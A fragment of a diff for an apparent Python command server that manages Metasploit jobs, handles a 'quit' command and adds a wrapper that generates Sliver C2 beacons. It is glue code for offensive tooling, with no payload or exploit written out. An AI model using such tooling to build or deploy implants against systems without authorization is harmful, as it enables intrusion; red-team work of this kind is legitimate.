-                lines.append(f"ID: {jid}, Name: {jinfo['name']}")
-            return f"{GREEN}Active Jobs:\n" + "\n".join(lines) + f"{RESET}"
-        else:
-            jobs = msfInstance.jobs.list
-            if jobs:
-                job_list = "\n".join([
-                    f"ID: {jid}, Name: {jdata['name']}"
-                    for jid, jdata in jobs.items()
-                ])                
-                response = f"{GREEN}Active Jobs:\\n{job_list}{RESET}"
-            else:
-                response = f"{RED}No active jobs.{RESET}"
+        jobs_dict = msfInstance.jobs.list
+        if not jobs_dict:
+            return "No active jobs."
+        return "\n".join([f"ID {jid}: {info['name']}" for jid, info in jobs_dict.items()])
 
-    elif command == "quit":
-        response = f"{GREEN}[+] Server shutting down as requested by {client_address}{RESET}"
+    # ------------------------------------------------------------------ quit
+    if command == "quit":
         if server is not None:
             server.exit()
-        else:
-            response = f"{RED}[!] Server not initialized {RESET}"
-        
-        return response
-            
-    else:
-        return f"{RED}Invalid command or not in search mode.{RESET}"
+            return f"{GREEN}[+] Server shutting down as requested.{RESET}"
+        return f"{RED}[!] Server not initialized.{RESET}"
+    
+    # ------------------------------------------------------------------ fallthrough
+    return f"{RED}[!] Unrecognized or incomplete command.{RESET}"
 
-
+def create_sliver_beacon(operator, lhost, seconds, jitter, http, os, arch, name):
+    return generate_beacon(seconds, jitter, http, os, arch, name)
 ##############################
 # MAIN
 ##############################
